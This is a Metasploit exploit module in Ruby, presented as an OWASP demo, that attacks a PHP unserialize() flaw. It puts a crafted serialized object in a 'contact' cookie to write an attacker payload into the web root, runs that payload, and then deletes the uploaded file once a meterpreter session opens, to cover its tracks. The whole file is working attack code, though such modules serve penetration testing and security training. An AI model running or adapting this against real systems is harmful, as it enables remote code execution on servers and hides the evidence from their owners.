##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'OWASP Demo MSF Unserialize',
      'Description'    => %q{
          Demo exploit for OWASP
      },
      'Author'	=>
        [
          'Uncle Tony'
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'https://cattleguard.github.io' ]
        ],
      'Privileged'     => false,
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Payload'        =>
        {
          'DisableNops' => true,
        },
      'Targets'        => [ ['Automatic', {}] ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Dec 04 2019'
      ))

      register_options(
        [
          OptString.new('TARGETURI', [ true, "Base path location of demo PHP", "/"])
        ])
  end


  def on_new_session(client)
    if client.type == "meterpreter"
      client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
      begin
        print_warning("Deleting #{@upload_php}")
        client.fs.file.rm(@upload_php)
        print_good("#{@upload_php} removed to stay ninja")
      rescue
        print_error("Unable to remove #{f}")
      end
    end
  end

  def exploit
    base = target_uri.path
    base << '/' if base[-1, 1] != '/'
    @upload_php = rand_text_alpha(rand(4) + 4) + ".php"

    writeable_path = "/var/www/html/uproar/"

    php_payload = "#{payload.encoded}"


    startyoengines = Rex::Text.uri_encode("O:15:\"NeatSecretClass\":2:{s:27:\"")+"%00NeatSecretClass%00error_text"+Rex::Text.uri_encode("\";s:#{php_payload.length}:\"#{php_payload}\";s:25:\"")+"%00NeatSecretClass%00filename"+Rex::Text.uri_encode("\";s:#{writeable_path.length + @upload_php.length }:\"#{writeable_path + @upload_php}")+Rex::Text.uri_encode("\";}")
    print_status(startyoengines.gsub("/", "%2F"))



    print_status("Exploiting the unserialize() to upload PHP code")
    print_status(normalize_uri(target_uri.path, 'test.php'))
    print_status("contact=#{startyoengines.gsub("/", "%2F")}")

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'test.php'),
      'cookie' => "contact=#{startyoengines.gsub("/", "%2F")}"
    )



    if not res or res.code != 200
      print_error("Exploit failed: #{res.code}.")
      return
    else
      print_good("#{res}")
    end

    print_status("Executing the payload #{@upload_php}")

    res = send_request_cgi(
    {
      'method' => 'GET',
      'uri'    => normalize_uri(base + "/uproar/", @upload_php+"?e="+Rex::Text.uri_encode("#{payload.encoded}")),
    })
    print_status(normalize_uri(base + "/uproar/", @upload_php+"?e="+Rex::Text.uri_encode("#{payload.encoded}")))

    if res
      print_good("Payload execution may have succeeded? : #{res}")

      return
    end

  end
end
